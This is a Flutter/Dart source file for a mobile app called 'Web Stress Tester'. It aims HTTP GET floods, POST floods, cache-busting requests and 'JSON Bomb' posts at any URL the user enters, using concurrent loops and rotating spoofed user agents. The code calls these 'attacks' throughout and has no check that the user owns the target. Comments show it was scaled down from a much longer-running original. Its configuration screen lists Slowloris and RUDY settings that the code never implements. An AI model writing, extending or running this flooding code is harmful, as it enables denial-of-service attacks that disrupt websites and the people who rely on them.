import 'package:flutter/material.dart';

import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'package:http/http.dart' as http;
import 'package:provider/provider.dart';

void main() {
  runApp(
    ChangeNotifierProvider(
      create: (context) => AttackController(),
      child: const StressTestApp(),
    ),
  );
}

class StressTestApp extends StatelessWidget {
  const StressTestApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Web Stress Tester',
      theme: ThemeData.dark(),
      home: const HomeScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  _HomeScreenState createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  final _urlController = TextEditingController();
  final _formKey = GlobalKey<FormState>();

  @override
  Widget build(BuildContext context) {
    final controller = Provider.of<AttackController>(context);

    return Scaffold(
      appBar: AppBar(
        title: const Text('Web Application Stress Tester'),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Form(
          key: _formKey,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              const Text(
                'Enter target URL:',
                style: TextStyle(fontSize: 18),
              ),
              const SizedBox(height: 10),
              TextFormField(
                controller: _urlController,
                decoration: const InputDecoration(
                  hintText: 'https://example.com',
                  border: OutlineInputBorder(),
                ),
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'Please enter a URL';
                  }
                  if (!value.startsWith('http')) {
                    return 'URL must start with http/https';
                  }
                  return null;
                },
              ),
              const SizedBox(height: 20),
              ElevatedButton(
                onPressed: controller.isAttacking
                    ? null
                    : () {
                  if (_formKey.currentState!.validate()) {
                    controller.startAttack(_urlController.text);
                  }
                },
                style: ElevatedButton.styleFrom(
                  padding: const EdgeInsets.symmetric(vertical: 16),
                  backgroundColor: Colors.red,
                ),
                child: Text(
                  controller.isAttacking ? 'Stress Test In Progress...' : 'Start Stress Test',
                  style: const TextStyle(fontSize: 18),
                ),
              ),
              if (controller.isAttacking) ...[
                const SizedBox(height: 20),
                LinearProgressIndicator(
                  value: controller.elapsedTime / controller.attackDuration,
                  backgroundColor: Colors.grey[800],
                  color: Colors.red,
                  minHeight: 10,
                ),
                const SizedBox(height: 10),
                Text(
                  'Attacking: ${controller.targetUrl}',
                  style: const TextStyle(fontSize: 16),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 5),
                Text(
                  'Elapsed: ${controller.elapsedTime ~/ 60}m ${controller.elapsedTime % 60}s '
                      '| Remaining: ${(controller.attackDuration - controller.elapsedTime) ~/ 60}m '
                      '${(controller.attackDuration - controller.elapsedTime) % 60}s',
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 20),
                const Text(
                  'Attack Statistics:',
                  style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 10),
                Expanded(child: _buildStatsTable(controller)),
                const SizedBox(height: 20),
                ElevatedButton(
                  onPressed: controller.stopAttack,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.blueGrey,
                    padding: const EdgeInsets.symmetric(vertical: 16),
                  ),
                  child: const Text('Stop Attack'),
                ),
              ] else ...[
                const SizedBox(height: 20),
                const Divider(),
                const Text(
                  'Attack Configuration:',
                  style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                ),
                const SizedBox(height: 10),
                _buildConfigItem('Duration', '${controller.attackDuration} seconds'),
                _buildConfigItem('Threads per Attack', '${controller.threadsPerAttack}'),
                _buildConfigItem('Slowloris Sockets', '${controller.slowlorisSockets}'),
                _buildConfigItem('RUDY Body Length', '${controller.rudyBodyLength} bytes'),
              ],
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildConfigItem(String title, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 5),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(title),
          Text(value, style: const TextStyle(fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  Widget _buildStatsTable(AttackController controller) {
    return SingleChildScrollView(
      scrollDirection: Axis.vertical,
      child: DataTable(
        columnSpacing: 20,
        columns: const [
          DataColumn(label: Text('Attack')),
          DataColumn(label: Text('Req/Sec')),
          DataColumn(label: Text('Success')),
          DataColumn(label: Text('Errors')),
          DataColumn(label: Text('Rate')),
        ],
        rows: controller.attackStats.entries.map((entry) {
          final stats = entry.value;
          final reqPerSec = stats.attempts / max(1, controller.elapsedTime);
          return DataRow(cells: [
            DataCell(Text(entry.key)),
            DataCell(Text(reqPerSec.toStringAsFixed(1))),
            DataCell(Text(stats.successes.toString())),
            DataCell(Text(stats.errors.toString())),
            DataCell(Text('${stats.successRate.toStringAsFixed(1)}%')),
          ]);
        }).toList(),
      ),
    );
  }
}

class AttackController with ChangeNotifier {
  // Configuration
  final int attackDuration = 60; // Seconds for demo (original was 969786)
  final int threadsPerAttack = 3; // Reduced for mobile safety
  final int slowlorisSockets = 20; // Reduced for mobile
  final int rudyBodyLength = 1024; // Reduced for mobile
  final int httpGetFloodCount = 50; // Reduced for mobile

  // Attack state
  bool isAttacking = false;
  String targetUrl = '';
  int elapsedTime = 0;
  Timer? _attackTimer;
  Timer? _statsTimer;
  bool _shouldStop = false;

  // Attack statistics
  Map<String, AttackStats> attackStats = {};

  // User agents for requests
  final userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
  ];

  void startAttack(String url) {
    if (isAttacking) return;

    targetUrl = url;
    isAttacking = true;
    _shouldStop = false;
    elapsedTime = 0;
    attackStats.clear();

    // Initialize attack stats
    for (final attack in _attacks) {
      attackStats[attack] = AttackStats();
    }

    // Start attack timer
    _attackTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      elapsedTime++;
      if (elapsedTime >= attackDuration || _shouldStop) {
        stopAttack();
      }
      notifyListeners(); // Notify listeners for time updates
    });

    // Start stats update timer
    _statsTimer = Timer.periodic(const Duration(seconds: 2), (_) => notifyListeners());

    // Start attack methods
    for (final attack in _attacks) {
      for (int i = 0; i < threadsPerAttack; i++) {
        _startAttackMethod(attack);
      }
    }

    notifyListeners();
  }

  void stopAttack() {
    _shouldStop = true;
    _attackTimer?.cancel();
    _statsTimer?.cancel();

    Future.delayed(const Duration(seconds: 1), () {
      isAttacking = false;
      notifyListeners();
    });
  }

  void _startAttackMethod(String attackName) async {
    while (!_shouldStop) {
      try {
        bool success = false;

        switch (attackName) {
          case 'HTTP GET Flood':
            success = await _httpGetFlood();
            break;
          case 'HTTP POST Flood':
            success = await _httpPostFlood();
            break;
          case 'Cache Busting':
            success = await _cacheBustingAttack();
            break;
          case 'JSON Bomb':
            success = await _jsonBombAttack();
            break;
        }

        attackStats[attackName]!.update(success);
      } catch (e) {
        attackStats[attackName]!.update(false);
      }

      // Add delay between requests
      await Future.delayed(Duration(milliseconds: _getDelayForAttack(attackName)));
    }
  }

  Future<bool> _httpGetFlood() async {
    final uri = Uri.parse('$targetUrl/${_randomString(5, 10)}');
    final headers = {'User-Agent': _randomUserAgent()};

    try {
      final response = await http.get(uri, headers: headers).timeout(
        const Duration(seconds: 5),
      );
      return response.statusCode < 500;
    } catch (e) {
      return false;
    }
  }

  Future<bool> _httpPostFlood() async {
    final uri = Uri.parse(targetUrl);
    final headers = {
      'User-Agent': _randomUserAgent(),
      'Content-Type': 'application/x-www-form-urlencoded'
    };
    final body = {
      _randomString(4, 8): _randomString(10, 50),
      _randomString(4, 8): _randomString(10, 50),
    };

    try {
      final response = await http.post(
        uri,
        headers: headers,
        body: body,
      ).timeout(const Duration(seconds: 5));

      return response.statusCode < 500;
    } catch (e) {
      return false;
    }
  }

  Future<bool> _cacheBustingAttack() async {
    final uri = Uri.parse('$targetUrl/${_randomString(5, 10)}?_=${_randomInt(1000000, 9999999)}');
    final headers = {'User-Agent': _randomUserAgent()};

    try {
      final response = await http.get(uri, headers: headers).timeout(
        const Duration(seconds: 5),
      );
      return response.statusCode < 500;
    } catch (e) {
      return false;
    }
  }

  Future<bool> _jsonBombAttack() async {
    final uri = Uri.parse(targetUrl);
    final headers = {
      'User-Agent': _randomUserAgent(),
      'Content-Type': 'application/json'
    };

    final body = json.encode({
      'data': List.generate(20, (_) => _randomString(50, 100)),
      'nested': {
        'level1': {
          'level2': {
            'level3': List.generate(10, (_) => _randomString(30, 60))
          }
        }
      }
    });

    try {
      final response = await http.post(
        uri,
        headers: headers,
        body: body,
      ).timeout(const Duration(seconds: 10));

      return response.statusCode < 500;
    } catch (e) {
      return false;
    }
  }

  // Helper methods
  String _randomString(int min, int max) {
    final length = min + Random().nextInt(max - min);
    final chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return String.fromCharCodes(Iterable.generate(
      length,
          (_) => chars.codeUnitAt(Random().nextInt(chars.length)),
    ));
  }

  int _randomInt(int min, int max) => min + Random().nextInt(max - min);

  String _randomUserAgent() => userAgents[Random().nextInt(userAgents.length)];

  int _getDelayForAttack(String attackName) {
    switch (attackName) {
      case 'HTTP GET Flood':
        return 100 + Random().nextInt(400);
      case 'HTTP POST Flood':
        return 150 + Random().nextInt(350);
      case 'Cache Busting':
        return 50 + Random().nextInt(150);
      case 'JSON Bomb':
        return 500 + Random().nextInt(1500);
      default:
        return 200;
    }
  }

  final _attacks = [
    'HTTP GET Flood',
    'HTTP POST Flood',
    'Cache Busting',
    'JSON Bomb',
  ];
}

class AttackStats {
  int attempts = 0;
  int successes = 0;
  int errors = 0;

  double get successRate => attempts == 0 ? 0 : (successes / attempts) * 100;

  void update(bool success) {
    attempts++;
    if (success) {
      successes++;
    } else {
      errors++;
    }
  }
}